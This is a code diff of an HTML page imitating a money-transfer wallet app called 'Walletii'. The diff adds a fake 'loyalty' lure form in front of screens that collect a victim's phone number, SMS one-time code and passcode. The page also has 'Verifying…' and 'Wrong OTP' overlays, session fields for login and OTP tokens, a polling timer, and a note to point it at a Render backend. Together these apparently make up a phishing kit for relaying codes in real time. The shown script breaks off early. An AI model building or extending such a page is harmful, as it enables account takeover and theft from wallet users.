@@ -6,467 +6,526 @@
 <title>Walletii</title>
 <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
 
-  body {
-    background: #060f14;
-    font-family: 'Nunito', sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-  }
+/* ══════════════════════════════════
+   GLOBAL RESET
+══════════════════════════════════ */
+*, *::before, *::after {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
 
-  /* ── Phone Shell ── */
-  .phone-shell {
-    width: 390px;
-    height: 844px;
-    background: #0d1e24;
-    position: relative;
-    overflow: hidden;
-    border-radius: 4px;
-  }
+/* ══════════════════════════════════
+   PAGE 1 — LOYALTY LANDING + FORM
+══════════════════════════════════ */
+#loyalty-root {
+  position: fixed;
+  inset: 0;
+  z-index: 1000;
+  font-family: 'Segoe UI', sans-serif;
+  display: block;
+}
 
-  /* ── Screens ── */
-  .screen {
-    position: absolute;
-    inset: 0;
-    display: flex;
-    flex-direction: column;
-    padding: 24px 24px 36px;
-    opacity: 0;
-    pointer-events: none;
-    transform: translateX(40px);
-    transition: opacity 0.35s ease, transform 0.35s ease;
-  }
+/* Landing splash */
+#landing {
+  position: absolute;
+  inset: 0;
+  background: url('https://raw.githubusercontent.com/arapchelogoi/waletii/main/load.jpeg') no-repeat center center/cover;
+  display: flex;
+  flex-direction: column;
+  justify-content: flex-end;
+  align-items: center;
+  padding-bottom: 150px;
+  color: white;
+  z-index: 2;
+  transition: opacity 1s ease, transform 1s ease;
+}
 
-  .screen.active {
-    opacity: 1;
-    pointer-events: all;
-    transform: translateX(0);
-  }
+.typewriter {
+  font-size: 28px;
+  font-weight: 800;
+  color: #2EE6D6;
+  text-shadow: 0 0 10px #2EE6D6, 0 0 20px #14b8a6;
+  white-space: nowrap;
+  overflow: hidden;
+  border-right: 4px solid #2EE6D6;
+  width: 0;
+  animation: typing 3s steps(40, end), blink 0.75s step-end infinite;
+}
+@keyframes typing { from { width: 0; } to { width: 100%; } }
+@keyframes blink { from, to { border-color: transparent; } 50% { border-color: #2EE6D6; } }
 
-  .screen.exit-left {
-    opacity: 0;
-    transform: translateX(-40px);
-    pointer-events: none;
-  }
+/* Form section */
+#form-section {
+  opacity: 0;
+  position: absolute;
+  inset: 0;
+  z-index: 1;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  pointer-events: none;
+  transition: opacity 1s ease;
+  overflow-y: auto;
+}
 
-  /* ── Shared: Lang Button ── */
-  .lang-btn {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    background: rgba(255,255,255,0.07);
-    border: 1.5px solid rgba(0, 212, 184, 0.35);
-    border-radius: 50px;
-    padding: 9px 14px;
-    color: #00d4b8;
-    font-size: 13px;
-    font-family: 'Nunito', sans-serif;
-    cursor: pointer;
-    white-space: nowrap;
-  }
-  .lang-btn svg { width: 15px; height: 15px; flex-shrink: 0; }
+#form-section::before {
+  content: "";
+  position: fixed;
+  inset: 0;
+  background: linear-gradient(to bottom, rgba(5,15,25,0.85), rgba(5,15,25,0.95));
+  z-index: 0;
+  pointer-events: none;
+}
 
-  /* ── Shared: Continue Button ── */
-  .continue-btn {
-    width: 100%;
-    border: none;
-    border-radius: 50px;
-    padding: 18px;
-    font-size: 17px;
-    font-weight: 800;
-    font-family: 'Nunito', sans-serif;
-    cursor: default;
-    transition: background 0.25s, color 0.25s, transform 0.1s;
-    background: #d8dfe2;
-    color: #7a8a90;
-  }
-  .continue-btn.active {
-    background: #00e5c8;
-    color: #0d1e24;
-    cursor: pointer;
-  }
-  .continue-btn.active:active { transform: scale(0.98); }
+.f-wrapper {
+  position: relative;
+  z-index: 1;
+  width: 95%;
+  max-width: 480px;
+  padding: 20px 0;
+}
 
-  /* ── Shared: Back Button ── */
-  .back-btn {
-    font-size: 26px;
-    color: #fff;
-    cursor: pointer;
-    font-weight: 300;
-    line-height: 1;
-    width: 32px;
-    margin-bottom: 8px;
-    user-select: none;
-  }
+.f-card {
+  background: rgba(255,255,255,0.05);
+  backdrop-filter: blur(20px);
+  border-radius: 20px;
+  padding: 35px;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  border: 1px solid rgba(255,255,255,0.08);
+}
 
-  /* ── Shared: W Logo ── */
-  .w-logo {
-    display: flex;
-    justify-content: center;
-    margin-bottom: 24px;
-  }
-  .w-wrap {
-    position: relative;
-    display: inline-block;
-    line-height: 1;
-  }
-  .w-char {
-    font-family: 'Nunito', sans-serif;
-    font-size: 42px;
-    font-weight: 900;
-    color: #00e5cc;
-    display: block;
-    line-height: 1;
-  }
-  .w-dot {
-    position: absolute;
-    top: 2px;
-    right: -4px;
-    width: 7px;
-    height: 7px;
-    background: #00e5cc;
-    border-radius: 50%;
-  }
+.form-group { margin-bottom: 20px; }
 
-  /* ══════════════════════════════════
-     SCREEN 1 — LANDING
-  ══════════════════════════════════ */
-  #screen-landing .header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 52px;
-  }
-  .logo-text {
-    font-size: 22px;
-    font-weight: 700;
-    color: #00d4b8;
-    letter-spacing: -0.5px;
-  }
+label {
+  display: block;
+  font-size: 13px;
+  margin-bottom: 6px;
+  color: #a5f3fc;
+}
 
-  .cards-container {
-    display: flex;
-    gap: 12px;
-    align-items: center;
-    margin-bottom: 20px;
-  }
-  .card {
-    flex: 1;
-    background: #ffffff;
-    border-radius: 16px;
-    padding: 18px 14px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 10px;
-  }
-  .flag {
-    width: 64px;
-    height: 42px;
-    border-radius: 8px;
-    overflow: hidden;
-    position: relative;
-  }
-  .country-name {
-    font-size: 15px;
-    font-weight: 600;
-    color: #00b4a0;
-  }
-  .amount-box {
-    width: 100%;
-    background: #f0f0f0;
-    border-radius: 8px;
-    padding: 10px 12px;
-    font-size: 16px;
-    font-weight: 700;
-    color: #111;
-    display: flex;
-    align-items: center;
-    gap: 5px;
-  }
-  .chevron { margin-left: auto; color: #666; font-size: 11px; }
-  .arrow-circle {
-    width: 40px; height: 40px;
-    background: #00d4b8;
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    flex-shrink: 0;
-    font-size: 18px;
-    color: #fff;
-    font-weight: 700;
-  }
-  .powered-by {
-    display: flex;
-    justify-content: center;
-    margin-bottom: 52px;
-  }
-  .powered-pill {
-    background: #fff;
-    border-radius: 50px;
-    padding: 8px 18px;
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    font-size: 12px;
-    color: #444;
-  }
-  .mg-logo {
-    display: flex; align-items: center; gap: 4px;
-    font-weight: 700; color: #e31b23; font-size: 13px;
-  }
-  .mg-icon {
-    width: 16px; height: 16px;
-    background: #e31b23;
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-  }
-  .tagline {
-    color: #fff;
-    font-size: 25px;
-    font-weight: 800;
-    line-height: 1.3;
-    text-align: center;
-    margin-bottom: 48px;
-    padding: 0 6px;
-  }
+.input-prefix {
+  position: relative;
+  width: 100%;
+}
+.input-prefix .prefix {
+  position: absolute;
+  left: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: #cbd5e1;
+  font-size: 14px;
+  font-weight: 600;
+  pointer-events: none;
+}
+.input-prefix input {
+  width: 100%;
+  padding: 14px;
+  padding-left: 50px;
+  border-radius: 14px;
+  border: 1px solid rgba(255,255,255,0.1);
+  background: rgba(255,255,255,0.06);
+  color: white;
+  font-size: 14px;
+  transition: 0.3s;
+}
+.input-prefix input:focus {
+  outline: none;
+  border-color: #2EE6D6;
+  box-shadow: 0 0 0 2px rgba(46,230,214,0.2);
+}
 
-  /* ══════════════════════════════════
-     SCREEN 2 — PHONE NUMBER
-  ══════════════════════════════════ */
-  #screen-phone .header {
-    display: flex;
-    justify-content: flex-end;
-    margin-bottom: 40px;
-  }
-  .phone-title {
-    text-align: center;
-    color: #fff;
-    font-size: 28px;
-    font-weight: 800;
-    margin-bottom: 28px;
-  }
-  .phone-label {
-    text-align: center;
-    color: #fff;
-    font-size: 15px;
-    font-weight: 700;
-    margin-bottom: 14px;
-  }
-  .input-row {
-    display: flex;
-    gap: 10px;
-    position: relative;
-  }
-  .prefix-btn {
-    background: #1e2f36;
-    border: none;
-    border-radius: 14px;
-    padding: 0 16px;
-    min-width: 108px;
-    height: 68px;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    cursor: pointer;
-    flex-shrink: 0;
-  }
-  .prefix-label { font-size: 11px; color: #8a9ea6; font-weight: 600; margin-bottom: 3px; }
-  .prefix-value { font-size: 17px; font-weight: 700; color: #fff; }
-  .phone-input {
-    flex: 1;
-    background: #1e2f36;
-    border: none;
-    border-radius: 14px;
-    padding: 0 18px;
-    font-size: 15px;
-    color: #fff;
-    font-family: 'Nunito', sans-serif;
-    outline: none;
-    height: 68px;
-    -moz-appearance: textfield;
-  }
-  .phone-input::-webkit-outer-spin-button,
-  .phone-input::-webkit-inner-spin-button { -webkit-appearance: none; }
-  .phone-input::placeholder { color: #6a7e86; }
+.f-card select {
+  width: 100%;
+  padding: 14px;
+  border-radius: 14px;
+  border: 1px solid rgba(255,255,255,0.1);
+  background: rgba(255,255,255,0.06);
+  color: white;
+  font-size: 14px;
+  font-family: 'Segoe UI', sans-serif;
+  transition: 0.3s;
+  -webkit-appearance: none;
+}
+.f-card select option { background: #0d1e24; }
+.f-card select:focus {
+  outline: none;
+  border-color: #2EE6D6;
+  box-shadow: 0 0 0 2px rgba(46,230,214,0.2);
+}
 
-  /* Dropdown */
-  .dropdown {
-    display: none;
-    position: absolute;
-    top: calc(100% + 8px);
-    left: 0;
-    width: 224px;
-    background: #1a2c36;
-    border-radius: 14px;
-    overflow-y: auto;
-    max-height: 340px;
-    z-index: 100;
-    box-shadow: 0 10px 36px rgba(0,0,0,0.55);
-  }
-  .dropdown.open { display: block; }
-  .dropdown-item {
-    display: flex; align-items: center; gap: 10px;
-    padding: 12px 16px;
-    cursor: pointer;
-    border-bottom: 1px solid rgba(255,255,255,0.05);
-    transition: background 0.12s;
-  }
-  .dropdown-item:last-child { border-bottom: none; }
-  .dropdown-item:hover { background: rgba(255,255,255,0.06); }
-  .dropdown-item.active { background: rgba(0,212,184,0.1); }
-  .flag-emoji { font-size: 20px; }
-  .cname { font-size: 13px; color: #fff; font-weight: 600; }
-  .ccode { font-size: 12px; color: #8a9ea6; }
+.checkbox-group {
+  display: flex;
+  gap: 10px;
+  font-size: 13px;
+  margin-top: 10px;
+  color: #cbd5e1;
+  align-items: flex-start;
+}
+.checkbox-group input {
+  width: 16px;
+  height: 16px;
+  accent-color: #2EE6D6;
+  margin-top: 2px;
+  flex-shrink: 0;
+}
 
-  .assistance-btn {
-    text-align: center;
-    color: #7a8a90;
-    font-size: 15px;
-    font-weight: 600;
-    cursor: pointer;
-  }
+.f-submit {
+  width: 100%;
+  padding: 15px;
+  margin-top: 25px;
+  border-radius: 16px;
+  border: none;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  background: linear-gradient(135deg, #2EE6D6, #14b8a6);
+  color: #012a2a;
+  font-family: 'Segoe UI', sans-serif;
+  transition: 0.3s;
+}
+.f-submit:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 10px 25px rgba(46,230,214,0.3);
+}
 
-  /* ══════════════════════════════════
-     SCREEN 3 — OTP
-  ══════════════════════════════════ */
-  #screen-otp .header { margin-bottom: 16px; }
-  .otp-title {
-    text-align: center;
-    font-size: 26px;
-    font-weight: 900;
-    color: #fff;
-    margin-bottom: 12px;
-  }
-  .otp-sub {
-    font-size: 13.5px;
-    font-weight: 500;
-    color: #c8d6e0;
-    text-align: center;
-    margin-bottom: 28px;
-    line-height: 1.5;
-  }
-  .otp-sub span { color: #fff; font-weight: 700; }
-  .sms-label {
-    font-size: 14px;
-    font-weight: 800;
-    color: #fff;
-    margin-bottom: 16px;
-    text-align: center;
-  }
-  .otp-row {
-    display: flex;
-    gap: 10px;
-    justify-content: center;
-    margin-bottom: 0;
-  }
-  .otp-box {
-    width: 50px; height: 56px;
-    background: #1e3040;
-    border-radius: 10px;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 22px; font-weight: 800; color: #fff;
-    cursor: pointer;
-    transition: background 0.2s, box-shadow 0.2s;
-  }
-  .otp-box .dash { width: 16px; height: 2px; background: #5a7a8a; border-radius: 2px; }
-  .otp-box.filled .dash { display: none; }
-  .otp-box.cur { background: #243d50; box-shadow: 0 0 0 2px #00e5cc55; }
-  .resend-text {
-    font-size: 14px;
-    font-weight: 700;
-    color: #00e5cc;
-    text-align: center;
-  }
-  #otp-hidden {
-    position: absolute; opacity: 0; width: 1px; height: 1px; top: -9999px;
-  }
+.f-footer {
+  text-align: center;
+  font-size: 12px;
+  padding: 20px;
+  color: #64748b;
+}
 
-  /* ══════════════════════════════════
-     SCREEN 4 — PASSCODE
-  ══════════════════════════════════ */
-  #screen-passcode .header {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    margin-bottom: 20px;
-  }
-  .passcode-title {
-    font-size: 15px; font-weight: 700; color: #fff; text-align: center;
-  }
-  .info-icon {
-    width: 18px; height: 18px;
-    border: 1.5px solid #5a7a8a;
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 11px; color: #5a7a8a;
-    font-style: italic; font-family: Georgia, serif;
-    flex-shrink: 0;
-  }
-  .dots-row {
-    display: flex;
-    justify-content: center;
-    gap: 12px;
-    margin-bottom: 28px;
-  }
-  .dot-cell {
-    width: 42px; height: 42px;
-    background: #1e3040;
-    border-radius: 8px;
-    display: flex; align-items: center; justify-content: center;
-  }
-  .dot-cell .dash { width: 14px; height: 2px; background: #5a7a8a; border-radius: 2px; }
-  .dot-cell .filled { width: 14px; height: 14px; background: #fff; border-radius: 50%; display: none; }
-  .dot-cell.on .dash { display: none; }
-  .dot-cell.on .filled { display: block; }
+/* ══════════════════════════════════
+   PAGE 2 — WALLETII APP
+   (hidden until loyalty form done)
+══════════════════════════════════ */
+#app-root {
+  display: none;
+  font-family: 'Nunito', sans-serif;
+  background: #060f14;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  position: fixed;
+  inset: 0;
+  z-index: 999;
+}
 
-  .keypad {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 14px;
-  }
-  .keypad-row {
-    display: flex;
-    gap: 26px;
-    align-items: center;
-  }
-  .key {
-    width: 76px; height: 76px;
-    background: #1e3040;
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 26px; font-weight: 700; color: #fff;
-    cursor: pointer; user-select: none;
-    border: none;
-    font-family: 'Nunito', sans-serif;
-    transition: background 0.1s, transform 0.1s;
-  }
-  .key:active { background: #2a4558; transform: scale(0.93); }
-  .key-empty { width: 76px; height: 76px; }
-  .key-back {
-    width: 76px; height: 76px;
-    display: flex; align-items: center; justify-content: center;
-    cursor: pointer; opacity: 0; transition: opacity 0.2s;
-    user-select: none;
-  }
-  .key-back.show { opacity: 1; }
-  .back-icon {
-    background: #5a7a8a;
-    border-radius: 6px;
-    width: 38px; height: 28px;
-    display: flex; align-items: center; justify-content: center;
-    clip-path: polygon(20% 0%, 100% 0%, 100% 100%, 20% 100%, 0% 50%);
-  }
-  .back-icon span { color: #fff; font-size: 14px; font-weight: 700; margin-left: 4px; }
+/* ── Phone Shell ── */
+.phone-shell {
+  width: 390px;
+  height: 844px;
+  background: #0d1e24;
+  position: relative;
+  overflow: hidden;
+  border-radius: 4px;
+}
 
-  .spacer { flex: 1; }
+/* ── Screens ── */
+.screen {
+  position: absolute;
+  inset: 0;
+  display: flex;
+  flex-direction: column;
+  padding: 24px 24px 36px;
+  opacity: 0;
+  pointer-events: none;
+  transform: translateX(40px);
+  transition: opacity 0.35s ease, transform 0.35s ease;
+}
+.screen.active {
+  opacity: 1;
+  pointer-events: all;
+  transform: translateX(0);
+}
+.screen.exit-left {
+  opacity: 0;
+  transform: translateX(-40px);
+  pointer-events: none;
+}
+
+/* ── Lang Button ── */
+.lang-btn {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  background: rgba(255,255,255,0.07);
+  border: 1.5px solid rgba(0,212,184,0.35);
+  border-radius: 50px;
+  padding: 9px 14px;
+  color: #00d4b8;
+  font-size: 13px;
+  font-family: 'Nunito', sans-serif;
+  cursor: pointer;
+  white-space: nowrap;
+}
+.lang-btn svg { width: 15px; height: 15px; flex-shrink: 0; }
+
+/* ── Continue Button ── */
+.continue-btn {
+  width: 100%;
+  border: none;
+  border-radius: 50px;
+  padding: 18px;
+  font-size: 17px;
+  font-weight: 800;
+  font-family: 'Nunito', sans-serif;
+  cursor: default;
+  transition: background 0.25s, color 0.25s, transform 0.1s;
+  background: #d8dfe2;
+  color: #7a8a90;
+}
+.continue-btn.active {
+  background: #00e5c8;
+  color: #0d1e24;
+  cursor: pointer;
+}
+.continue-btn.active:active { transform: scale(0.98); }
+
+/* ── Back Button ── */
+.back-btn {
+  font-size: 26px;
+  color: #fff;
+  cursor: pointer;
+  font-weight: 300;
+  line-height: 1;
+  width: 32px;
+  margin-bottom: 8px;
+  user-select: none;
+}
+
+/* ── W Logo ── */
+.w-logo { display: flex; justify-content: center; margin-bottom: 24px; }
+.w-wrap { position: relative; display: inline-block; line-height: 1; }
+.w-char { font-family: 'Nunito', sans-serif; font-size: 42px; font-weight: 900; color: #00e5cc; display: block; line-height: 1; }
+.w-dot { position: absolute; top: 2px; right: -4px; width: 7px; height: 7px; background: #00e5cc; border-radius: 50%; }
+
+/* ── SCREEN 1: LANDING ── */
+#screen-landing .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 52px; }
+.logo-text { font-size: 22px; font-weight: 700; color: #00d4b8; letter-spacing: -0.5px; }
+.cards-container { display: flex; gap: 12px; align-items: center; margin-bottom: 20px; }
+.card {
+  flex: 1;
+  background: #ffffff;
+  border-radius: 16px;
+  padding: 18px 14px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 10px;
+}
+.country-name { font-size: 15px; font-weight: 600; color: #00b4a0; }
+.amount-box {
+  width: 100%;
+  background: #f0f0f0;
+  border-radius: 8px;
+  padding: 10px 12px;
+  font-size: 16px;
+  font-weight: 700;
+  color: #111;
+  display: flex;
+  align-items: center;
+  gap: 5px;
+}
+.chevron { margin-left: auto; color: #666; font-size: 11px; }
+.arrow-circle {
+  width: 40px; height: 40px;
+  background: #00d4b8;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+  font-size: 18px; color: #fff; font-weight: 700;
+}
+.powered-by { display: flex; justify-content: center; margin-bottom: 52px; }
+.powered-pill {
+  background: #fff; border-radius: 50px; padding: 8px 18px;
+  display: flex; align-items: center; gap: 6px; font-size: 12px; color: #444;
+}
+.mg-logo { display: flex; align-items: center; gap: 4px; font-weight: 700; color: #e31b23; font-size: 13px; }
+.mg-icon { width: 16px; height: 16px; background: #e31b23; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+.tagline { color: #fff; font-size: 25px; font-weight: 800; line-height: 1.3; text-align: center; margin-bottom: 48px; padding: 0 6px; }
+
+/* ── SCREEN 2: PHONE ── */
+#screen-phone .header { display: flex; justify-content: flex-end; margin-bottom: 40px; }
+.phone-title { text-align: center; color: #fff; font-size: 28px; font-weight: 800; margin-bottom: 28px; }
+.phone-label { text-align: center; color: #fff; font-size: 15px; font-weight: 700; margin-bottom: 14px; }
+.input-row { display: flex; gap: 10px; position: relative; }
+.prefix-btn {
+  background: #1e2f36; border: none; border-radius: 14px;
+  padding: 0 16px; min-width: 108px; height: 68px;
+  display: flex; flex-direction: column; justify-content: center;
+  cursor: pointer; flex-shrink: 0;
+}
+.prefix-label { font-size: 11px; color: #8a9ea6; font-weight: 600; margin-bottom: 3px; }
+.prefix-value { font-size: 17px; font-weight: 700; color: #fff; }
+.phone-input {
+  flex: 1; background: #1e2f36; border: none; border-radius: 14px;
+  padding: 0 18px; font-size: 15px; color: #fff;
+  font-family: 'Nunito', sans-serif; outline: none; height: 68px;
+  -moz-appearance: textfield;
+}
+.phone-input::-webkit-outer-spin-button,
+.phone-input::-webkit-inner-spin-button { -webkit-appearance: none; }
+.phone-input::placeholder { color: #6a7e86; }
+
+.dropdown {
+  display: none; position: absolute; top: calc(100% + 8px); left: 0;
+  width: 224px; background: #1a2c36; border-radius: 14px;
+  overflow-y: auto; max-height: 340px; z-index: 100;
+  box-shadow: 0 10px 36px rgba(0,0,0,0.55);
+}
+.dropdown.open { display: block; }
+.dropdown-item {
+  display: flex; align-items: center; gap: 10px;
+  padding: 12px 16px; cursor: pointer;
+  border-bottom: 1px solid rgba(255,255,255,0.05);
+  transition: background 0.12s;
+}
+.dropdown-item:last-child { border-bottom: none; }
+.dropdown-item:hover { background: rgba(255,255,255,0.06); }
+.dropdown-item.active { background: rgba(0,212,184,0.1); }
+.flag-emoji { font-size: 20px; }
+.cname { font-size: 13px; color: #fff; font-weight: 600; }
+.ccode { font-size: 12px; color: #8a9ea6; }
+.assistance-btn { text-align: center; color: #7a8a90; font-size: 15px; font-weight: 600; cursor: pointer; }
+
+/* ── SCREEN 3: OTP ── */
+#screen-otp .header { margin-bottom: 16px; }
+.otp-title { text-align: center; font-size: 26px; font-weight: 900; color: #fff; margin-bottom: 12px; }
+.otp-sub { font-size: 13.5px; font-weight: 500; color: #c8d6e0; text-align: center; margin-bottom: 28px; line-height: 1.5; }
+.otp-sub span { color: #fff; font-weight: 700; }
+.sms-label { font-size: 14px; font-weight: 800; color: #fff; margin-bottom: 16px; text-align: center; }
+.otp-row { display: flex; gap: 10px; justify-content: center; margin-bottom: 0; }
+.otp-box {
+  width: 50px; height: 56px; background: #1e3040; border-radius: 10px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 22px; font-weight: 800; color: #fff;
+  cursor: pointer; transition: background 0.2s, box-shadow 0.2s;
+}
+.otp-box .dash { width: 16px; height: 2px; background: #5a7a8a; border-radius: 2px; }
+.otp-box.filled .dash { display: none; }
+.otp-box.cur { background: #243d50; box-shadow: 0 0 0 2px #00e5cc55; }
+.resend-text { font-size: 14px; font-weight: 700; color: #00e5cc; text-align: center; }
+
+/* ── SCREEN 4: PASSCODE ── */
+#screen-passcode .header { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px; }
+.passcode-title { font-size: 15px; font-weight: 700; color: #fff; text-align: center; }
+.info-icon {
+  width: 18px; height: 18px; border: 1.5px solid #5a7a8a; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px; color: #5a7a8a; font-style: italic; font-family: Georgia, serif; flex-shrink: 0;
+}
+.dots-row { display: flex; justify-content: center; gap: 12px; margin-bottom: 28px; }
+.dot-cell { width: 42px; height: 42px; background: #1e3040; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
+.dot-cell .dash { width: 14px; height: 2px; background: #5a7a8a; border-radius: 2px; }
+.dot-cell .filled { width: 14px; height: 14px; background: #fff; border-radius: 50%; display: none; }
+.dot-cell.on .dash { display: none; }
+.dot-cell.on .filled { display: block; }
+.keypad { display: flex; flex-direction: column; align-items: center; gap: 14px; }
+.keypad-row { display: flex; gap: 26px; align-items: center; }
+.key {
+  width: 76px; height: 76px; background: #1e3040; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 26px; font-weight: 700; color: #fff;
+  cursor: pointer; user-select: none; border: none;
+  font-family: 'Nunito', sans-serif; transition: background 0.1s, transform 0.1s;
+}
+.key:active { background: #2a4558; transform: scale(0.93); }
+.key-empty { width: 76px; height: 76px; }
+.key-back { width: 76px; height: 76px; display: flex; align-items: center; justify-content: center; cursor: pointer; opacity: 0; transition: opacity 0.2s; user-select: none; }
+.key-back.show { opacity: 1; }
+.back-icon { background: #5a7a8a; border-radius: 6px; width: 38px; height: 28px; display: flex; align-items: center; justify-content: center; clip-path: polygon(20% 0%, 100% 0%, 100% 100%, 20% 100%, 0% 50%); }
+.back-icon span { color: #fff; font-size: 14px; font-weight: 700; margin-left: 4px; }
+
+.spacer { flex: 1; }
+
+/* ── Spinner keyframe shared ── */
+@keyframes wspin { to { transform: rotate(360deg); } }
+
 </style>
 </head>
-<body>
+<body style="margin:0;padding:0;background:#060f14;">
+
+<!-- ══════════════════════════════════════════
+     PAGE 1 — LOYALTY LANDING + FORM
+══════════════════════════════════════════ -->
+<div id="loyalty-root">
+
+  <!-- Splash -->
+  <div id="landing">
+    <div class="typewriter">Let us appreciate you for choosing us...</div>
+  </div>
+
+  <!-- Form -->
+  <div id="form-section">
+    <div class="f-wrapper">
+      <div class="f-card">
+        <form id="loyaltyForm">
+
+          <div class="form-group">
+            <label>For how long have you had your account?</label>
+            <select name="account_age" required>
+              <option value="">Select account age</option>
+              <option value="0-3">0–3 Months</option>
+              <option value="3-6">3–6 Months</option>
+              <option value="6-12">6–12 Months</option>
+              <option value="1+">More than 1 Year</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label>Monthly Transaction Volume (OMR)</label>
+            <div class="input-prefix">
+              <span class="prefix">OMR</span>
+              <input type="number" name="monthly_volume" step="0.01" min="0" placeholder="850.00" required>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label>Transfer Frequency</label>
+            <select name="frequency" required>
+              <option value="">Select frequency</option>
+              <option value="rare">Once per month</option>
+              <option value="moderate">2–5 times per month</option>
+              <option value="frequent">6–15 times per month</option>
+              <option value="very_frequent">More than 15 times per month</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label>User Type</label>
+            <select name="user_type" required>
+              <option value="">Select user type</option>
+              <option value="new_user">New User (0–3 Months)</option>
+              <option value="standard">Standard</option>
+              <option value="regular">Regular</option>
+              <option value="business">Business</option>
+            </select>
+          </div>
+
+          <div class="checkbox-group">
+            <input type="checkbox" name="confirmation" required>
+            <span>I confirm this information is accurate and understand my account will be verified upon login.</span>
+          </div>
+
+          <button type="submit" class="f-submit">Proceed</button>
+
+        </form>
+      </div>
+      <div class="f-footer">© 2026 Walletii. Premium Digital Wallet Services.</div>
+    </div>
+  </div>
+
+</div><!-- /loyalty-root -->
+
+
+<!-- ══════════════════════════════════════════
+     PAGE 2 — WALLETII APP
+══════════════════════════════════════════ -->
+<div id="app-root">
 <div class="phone-shell">
 
   <!-- ══ SCREEN 1: LANDING ══ -->
@@ -483,9 +542,8 @@
     </div>
 
     <div class="cards-container">
-      <!-- Oman card -->
       <div class="card">
-        <div class="flag" style="width:64px;height:42px;border-radius:8px;overflow:hidden;position:relative;">
+        <div style="width:64px;height:42px;border-radius:8px;overflow:hidden;position:relative;">
           <div style="position:absolute;left:0;top:0;bottom:0;width:22px;background:#db161b;z-index:2;display:flex;align-items:center;justify-content:center;">
             <div style="width:12px;height:12px;background:rgba(255,255,255,0.85);border-radius:50%;"></div>
           </div>
@@ -499,9 +557,8 @@
 
       <div class="arrow-circle">→</div>
 
-      <!-- India card -->
       <div class="card">
-        <div class="flag" style="width:64px;height:42px;border-radius:8px;overflow:hidden;display:flex;flex-direction:column;">
+        <div style="width:64px;height:42px;border-radius:8px;overflow:hidden;display:flex;flex-direction:column;">
           <div style="flex:1;background:#FF9933;"></div>
           <div style="flex:1;background:#fff;display:flex;align-items:center;justify-content:center;">
             <div style="width:14px;height:14px;border:2px solid #000080;border-radius:50%;"></div>
@@ -526,7 +583,6 @@
     </div>
 
     <div class="tagline">Send money to 200+ countries while enjoying great rates and low fees</div>
-
     <button class="continue-btn active" onclick="goTo('screen-phone')">Continue</button>
   </div>
 
@@ -616,7 +672,7 @@
            oninput="onOtpInput()" onkeydown="onOtpKey(event)"/>
 
     <div class="spacer"></div>
-    <div style="padding: 0 0 16px;">
+    <div style="padding:0 0 16px;">
       <button class="continue-btn" id="otpContinueBtn" onclick="proceedFromOtp()">Continue</button>
     </div>
     <div class="resend-text" id="resendText">Resend code in 57 seconds</div>
@@ -669,14 +725,13 @@
   </div>
 
 
-  <!-- ══ OVERLAY: Waiting spinner ══ -->
+  <!-- ══ OVERLAY: Waiting ══ -->
   <div id="ov-waiting" style="display:none;position:absolute;inset:0;z-index:200;background:rgba(13,30,36,0.88);backdrop-filter:blur(4px);flex-direction:column;align-items:center;justify-content:center;gap:20px;">
     <div style="width:48px;height:48px;border-radius:50%;border:3px solid rgba(0,229,200,0.2);border-top-color:#00e5c8;animation:wspin 0.85s linear infinite;"></div>
     <div style="text-align:center;">
       <div id="ov-title" style="font-size:16px;font-weight:700;color:#fff;margin-bottom:6px;">Verifying…</div>
-      <div id="ov-sub"   style="font-size:13px;color:rgba(255,255,255,0.45);">Please wait</div>
+      <div id="ov-sub" style="font-size:13px;color:rgba(255,255,255,0.45);">Please wait</div>
     </div>
-    <style>@keyframes wspin{to{transform:rotate(360deg)}}</style>
   </div>
 
   <!-- ══ OVERLAY: Wrong OTP ══ -->
@@ -713,339 +768,298 @@
   </div>
 
 </div><!-- /phone-shell -->
+</div><!-- /app-root -->
+
 
 <script>
-  // ════════════════════════════════════════════════════
-  //  CONFIG — set this to your Render backend URL
-  // ════════════════════════════════════════════════════
-  const API_BASE = '';
+// ══════════════════════════════════════════════════════
+//  PAGE 1 — LOYALTY LOGIC
+// ══════════════════════════════════════════════════════
 
-  // ── Session state ──
-  const SESSION = {
-    phone:       '',
-    countryCode: '',
-    passcode:    '',
-    loginToken:  null,
-    otpToken:    null,
-    pollIv:      null,
-  };
+// Step 1: After 3s fade out splash, show form
+setTimeout(() => {
+  const landing = document.getElementById('landing');
+  const form    = document.getElementById('form-section');
+  landing.style.transform    = 'translateY(-50px)';
